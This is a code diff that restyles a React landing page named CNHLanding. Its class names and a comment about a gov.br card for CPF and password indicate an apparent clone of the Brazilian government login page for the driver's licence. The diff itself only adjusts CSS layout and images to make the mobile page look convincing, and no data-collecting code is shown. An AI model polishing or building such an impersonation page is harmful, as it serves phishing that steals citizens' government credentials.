@@ -89,6 +89,18 @@ export default function CNHLanding() {
   return (
     <>
       <style>{`
+        html, body, #root {
+          background-color: #000 !important;
+          height: 100dvh !important;
+          width: 100vw !important;
+          margin: 0 !important;
+          padding: 0 !important;
+          overflow: hidden !important;
+          display: flex !important;
+          justify-content: center !important;
+          align-items: center !important;
+        }
+
         .cnh-clone-body {
           font-family: 'Raleway', 'Rawline', sans-serif;
           background-color: #000;
@@ -108,17 +120,19 @@ export default function CNHLanding() {
         #tela-capa {
           width: 100%;
           max-width: 450px;
-          height: 100%;
+          height: 100dvh;
           background-color: #fff;
           position: relative;
           display: flex;
           flex-direction: column;
+          box-shadow: 0 0 40px rgba(0,0,0,0.8);
+          overflow: hidden;
         }
 
         .capa-area {
           height: 70%;
           width: 100%;
-          background-image: url('/img/capa_cnh.png');
+          background-image: url('/img/capa_cnh.png'), url('/capa_cnh.png'), url('/assets/splash_woman.png');
           background-size: cover;
           background-position: center top;
           position: relative;
@@ -143,7 +157,7 @@ export default function CNHLanding() {
           margin-top: -25px;
           position: relative;
           z-index: 10;
-          padding: 15px 30px;
+          padding: 20px 30px;
           display: flex;
           flex-direction: column;
           align-items: center;
@@ -162,7 +176,7 @@ export default function CNHLanding() {
           font-size: 12px;
           color: #333;
           line-height: 1.3;
-          margin-bottom: 12px;
+          margin-bottom: 10px;
         }
 
         .termos-texto a {
@@ -183,6 +197,14 @@ export default function CNHLanding() {
           cursor: pointer;
           box-shadow: 0 4px 8px rgba(19, 81, 180, 0.25);
           text-transform: uppercase;
+        }
+
+        @media (min-height: 800px) {
+          .conteudo-branco {
+            justify-content: flex-end;
+            padding-bottom: 40px;
+            gap: 20px;
+          }
         }
 
         /* --- GOV.BR CARD CONTAINER (CPF E SENHA) --- */
